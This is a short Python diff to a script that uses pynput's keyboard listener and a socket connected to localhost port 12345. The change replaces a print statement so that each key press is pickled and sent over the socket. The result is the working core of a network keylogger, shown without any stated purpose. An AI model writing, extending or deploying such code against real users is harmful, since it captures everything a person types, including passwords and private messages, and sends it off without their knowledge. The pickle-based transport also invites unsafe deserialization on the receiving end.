@@ -1,5 +1,6 @@
 import pynput
 import socket
+import pickle
 
 from pynput.keyboard import Key, Listener
 
@@ -9,7 +10,7 @@ server_address = ('localhost', 12345)
 client_socket.connect(server_address)
 
 def on_press(key):
-    print("press")
+    client_socket.sendall(pickle.dumps(key))
 
 def on_release(key):
     print("release")
